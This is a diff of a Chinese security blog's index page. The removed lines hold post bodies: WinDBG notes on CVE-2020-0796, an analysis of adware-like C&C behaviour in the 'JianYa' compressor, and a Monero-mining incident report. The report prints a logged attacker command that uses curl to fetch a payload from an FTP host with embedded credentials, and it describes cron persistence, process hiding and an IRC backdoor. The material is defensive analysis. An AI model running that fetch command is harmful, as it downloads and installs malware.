\&quot;srvnet!SrvNetAllocateBuffer(), SrvNetAllocateBufferFromPool()&#x3D;0x%I64x\&quot;, rax;.echo&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="8-思考和讨论"><a href="#8-思考和讨论" class="headerlink" title="8 思考和讨论"></a>8 思考和讨论</h2><p>能坚持读到这里确属不易：），我们思考讨论以下3个问题有没有较好的解决办法？</p>
-<ol>
-<li><p>如何像查看小于PAGE_SIZE的内存使用dt nt!_POOL_HEADER那样，查看large page allocation内存的size结构？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">因为没有large page头部，这些“大池”中的内存页是通过“大池索引表”（nt!PoolBigPageTable）来索引跟踪的；</span><br><span class="line">而用来确认池空间拥有者的池标识同样也没有保存头部信息（因为根本就没有头部），也同样是保存在PoolBigPageTable中。</span><br><span class="line">表的每一个入口点都用一个POOL_TRACKER_BIG_PAGES结构表示。</span><br><span class="line">详见《Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool》，作者：Alex Lonescu</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>对于较大的内存范围，如大于8字节，使用内存访问断点？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发一个WinDBG插件，设置指定范围内存的PAGE属性，触发异常</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>对于较复杂的执行流程，从最终的数据，如何便捷的向前溯源过往有关分支？有点类似反向污点数据追踪。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发一个WinDBG插件若RIP不等于预期的地址，就不断的输出当前指令及寄存器状态到日志</span><br></pre></td></tr></table></figure></li>
-</ol>
-
+          <p>人生若只如初见。本文是“洞鉴未来”系列文章首篇，试以CVE-2020-0796为例，为读者呈现漏洞分析工作视角。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -801,13 +379,6 @@
 
               <time title="创建时间：2019-09-16 08:00:00" itemprop="dateCreated datePublished" datetime="2019-09-16T08:00:00+08:00">2019-09-16</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 23:19:38" itemprop="dateModified" datetime="2020-05-05T23:19:38+08:00">2020-05-05</time>
-              </span>
 
           
 
@@ -820,66 +391,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="关于可疑域名exrnybuf-cn的溯源分析报告"><a href="#关于可疑域名exrnybuf-cn的溯源分析报告" class="headerlink" title="关于可疑域名exrnybuf.cn的溯源分析报告"></a>关于可疑域名exrnybuf.cn的溯源分析报告</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2019年09月16日，stxletto检测到一起指向exrnybuf.cn的可疑域名访问事件。从捕获的流量数据初步来看，属于伪装成GIF文件下载的C&amp;C行为。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-1.jpg" alt="图-1"></p>
-<p>在终端EDR反馈的信息中，</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-2.jpg" alt="图-2"></p>
-<p>发现可疑的请求来自C:\Windows\Explorer.EXE进程。通过函数调用栈，我们追溯到一个动态链接库文件JZipMenu64.dll。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-3.jpg" alt="图-3"></p>
-<p>通过JZipMenu64.dll所在路径，我们在关联到多个可疑进程。JYTool.exe和JYCheck.exe在VirusTotal上1/68的恶意样本检出率。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-4.jpg" alt="图-4"></p>
-<p>同时也发现了可疑的注册表项。</p>
-<p>进一步分析，带有数字签名的PE文件JZipMenu64.dll。</p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>JZipMenu64.dll</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>大小</td>
-<td>773,016 字节</td>
-</tr>
-<tr>
-<td>MD5</td>
-<td>87e110a5ca39a6b6afec3788577c9622</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>eb6c95e43c458ca300041ce452b18ff5b5a84b1711ba5e3f260216d8961c3565</td>
-</tr>
-<tr>
-<td>数字签名</td>
-<td>Shanghai Shen Wei Wang  Luo Ke Ji You Xian Gong Si（有效期2018/04/11~2019/04/12）</td>
-</tr>
-</tbody></table>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-5.jpg" alt="图-5"><br>JZipMenu64.dll是Winds平台下的shell扩展动态库，负责用户在右键点击时，显示解压菜单。<br>但分析显示在其DllMain中加载动态库后会自动执行的4处可疑代码块。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-6.jpg" alt="图-6"><br>1）使用GetPrivateProfileStringW获取main.ini中的配置。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-7.jpg" alt="图-7"><br>2）检测宿主进程名是否为main.ini中sys节Exp变量设定的进程名一致，不一致则退出执行流程。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-8.jpg" alt="图-8"><br>3）创建名为“jianya_dothing_mutex”的mutex，以实现执行实例唯一性。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-9.jpg" alt="图-9"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-10.jpg" alt="图-10"><br>4）创建新线程执行JYCheck.exe及获取config.db文件（即前文所述的GIF文件）。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-11.jpg" alt="图-11"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-12.jpg" alt="图-12"></p>
-<p>JYCheck.exe访问的URL。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-13.jpg" alt="图-13"></p>
-<p>主要用于流量统计。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-14.jpg" alt="图-14"></p>
-<p>2.0版本的GIF路径。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-15.jpg" alt="图-15"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-16.jpg" alt="图-16"><br>从特定的URL下载文件到本地的临时目录C:\Users\xx\AppData\Local\Temp\JY\config.db</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-17.jpg" alt="图-17"><br>经分析config.db是经过base64编码的配置文件。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-18.jpg" alt="图-18"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-19.jpg" alt="图-19"><br>Unicode转化</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-20.jpg" alt="图-20"><br>Base64解码</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-21.jpg" alt="图-21"><br>经Unicode转化、Base64解码、zip解压后即可得其明文文本。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-22.jpg" alt="图-22"><br>路径为C:\Users\Administrator\AppData\Roaming\JYZip\main.ini的配置文件。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-23.jpg" alt="图-23"><br>JYTool.exe通过传递的命令行参数（mini、news、tips、appupdui），执行对应ini文件中的块的配置。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-24.jpg" alt="图-24"></p>
-<p>值得特别注意的是notexc字段指定的进程名列表，是常见的抓包、分析、调试、安全等软件，notextip是若干地区的ip。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-25.jpg" alt="图-25"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-26.jpg" alt="图-26"></p>
-<p>当jianya_appupdui.exe读取这些配置时，就会根据配置决定是否继续执行流程。</p>
-<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-27.jpg" alt="图-27"></p>
-<p>Exe字段是静默推广安装的9款软件。当然其所有者可以在远程服务器的配置文件分发任意载荷。<br>另外，考虑其获取C&amp;C配置的协议、压缩\加密方式，也容易被劫持并下发任意推广安装指令。</p>
-<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-28.jpg" alt="图-28"><br>综上所述，从在系统中持久化存在方式、获取配置文件方式、对抗分析的方式及核心功能实现上来看，“简压”是一款对7-zip进行过度商业包装的风险软件。不建议企业客户使用。</p>
-
+          <p>2019年09月16日，stxletto检测到一起指向exrnybuf.cn的可疑域名访问事件。从捕获的流量数据初步来看，属于伪装成GIF文件下载的C&C行为。从在系统中持久化存在方式、获取配置文件方式、对抗分析的方式及核心功能实现上来看，“简压”是一款对7-zip进行过度商业包装的风险软件。不建议企业客户使用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -924,13 +444,6 @@
 
               <time title="创建时间：2019-08-08 08:00:00" itemprop="dateCreated datePublished" datetime="2019-08-08T08:00:00+08:00">2019-08-08</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 23:05:13" itemprop="dateModified" datetime="2020-05-05T23:05:13+08:00">2020-05-05</time>
-              </span>
 
           
 
@@ -943,218 +456,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="关于一宗门罗币挖矿安全事件的分析报告"><a href="#关于一宗门罗币挖矿安全事件的分析报告" class="headerlink" title="关于一宗门罗币挖矿安全事件的分析报告"></a>关于一宗门罗币挖矿安全事件的分析报告</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2019年08月08日，我们检测到一起利用SSH口令爆破感染、XHide隐藏伪装恶意程序进程、IRC服务作为C&amp;C的门罗币挖矿事件。从捕获的多个样本来看，7月份的样本较5月份的样本，增加了内网SSH弱口令爆破的横向渗透模块，更具危害性。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-1.jpg" alt="图-1"></p>
-<p>事件攻击流程图</p>
-<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>通过终端EDR反馈的定时任务和CPU资源占用情况，我们在/var/tmp/路径下发现9个可疑文件，并有一个以空格做为名称的文件夹。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-2.jpg" alt="图-2"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-3.jpg" alt="图-3"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-4.jpg" alt="图-4"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-5.jpg" alt="图-5"></p>
-<p>在日志系统中发现的异常命令（curl -O <a href="ftp://noji:noji2012@153.122.137.67/.kde/olduser.tgz；因此初步判定，系统遭遇网络恶意脚本攻击">ftp://noji:noji2012@153.122.137.67/.kde/olduser.tgz</a>）</p>
-<p>我们在指定的FTP服务器上追溯到olduser.taz和scn.db两个gzip\tar文件。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-6.jpg" alt="图-6"><br>olduser.taz内有go、i686、x86_64共3个文件。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-7.jpg" alt="图-7"><br>经分析，olduser中的模块主要实现挖矿功能。</p>
-<p>scn.db内有6个文件。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-8.jpg" alt="图-8"><br>经分析，scn中的模块主要实现横向渗透功能。</p>
-<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-9.jpg" alt="图-9"><br>恶意程序为当前用户添加了每1分钟执行一次的任务<br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-10.jpg" alt="图-10"></p>
-<h4 id="httpd文件"><a href="#httpd文件" class="headerlink" title="httpd文件"></a>httpd文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-11.jpg" alt="图-11"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-12.jpg" alt="图-12"></p>
-<p>httpd文件是一个bash脚本文件，主要功能是重启/lib/httpds恶意程序。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-13.jpg" alt="图-13"></p>
-<p>而/lib/httpds文件不存在，且httpd和后文所述update文件在逻辑结构上相似，此任务应是一个早期版本。</p>
-<h4 id="autorun文件"><a href="#autorun文件" class="headerlink" title="autorun文件"></a>autorun文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-14.jpg" alt="图-14"><br>autorun文件是一个bash脚本文件，主要功能是增加、更新定时任务update，并启动perl后门。</p>
-<h4 id="update文件"><a href="#update文件" class="headerlink" title="update文件"></a>update文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-15.jpg" alt="图-15"><br>update文件是一个bash脚本文件，主要功能是如果进程存在则杀死已有进程后重启/var/tmp/ /.p/run恶意程序。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-16.jpg" alt="图-16"><br>代码中mech.pid和实际的文件pid名称不对，导致无法杀死已有进程。每分钟执行一次定时任务后，会新建进程，导致系统中恶意进程越来越多。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-17.jpg" alt="图-17"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-18.jpg" alt="图-18"><br>在/var/opt/.crond/路径下发现相似文件，从创建时间等多种维度来看，变种进化过程如下：</p>
-<ul>
-<li>2019-04-28  /var/opt/.crond/.p/run</li>
-<li>2019-07-22  /var/tmp/ /.p/update</li>
-<li>2019-07-27  /lib/httpd？</li>
-</ul>
-<h3 id="IRC后门"><a href="#IRC后门" class="headerlink" title="IRC后门"></a>IRC后门</h3><p>IRC后门主要存在.p文件夹中，对比2个样本，</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-19.jpg" alt="图-19"><br>主要功能模块没有变化，主要是增加横向扩散功能、更新Perl版本的IRC后门以及改变恶意程序路径。</p>
-<h4 id="run文件"><a href="#run文件" class="headerlink" title="run文件"></a>run文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-20.jpg" alt="图-20"><br>run文件是一个bash脚本文件，主要功能是根据系统的硬件架构执行对应的XHide程序伪装执行python2elf版本的IRC后门，最后执行perl脚本的IRC后门。</p>
-<h4 id="h32-h64文件"><a href="#h32-h64文件" class="headerlink" title="h32\h64文件"></a>h32\h64文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-21.jpg" alt="图-21"><br>h32文件是一个linux/i386版本的XHide程序，<br>h64文件是一个linux//amd64版本的XHide程序，<br>用于进程伪装和隐藏。</p>
-<h4 id="run32-run64文件"><a href="#run32-run64文件" class="headerlink" title="run32\run64文件"></a>run32\run64文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-22.jpg" alt="图-22"></p>
-<p>run32文件是一个linux/i386版本的由pyinstaller生成的ELF文件;<br>Run64文件是一个linux/amd64版本的由pyinstaller生成的ELF文件;</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-23.jpg" alt="图-23"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-24.jpg" alt="图-24"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-25.jpg" alt="图-25"></p>
-<p>经分析其是一个用python语言开发undernetbot，用于使用IRC通道作为C&amp;C的后门程序。</p>
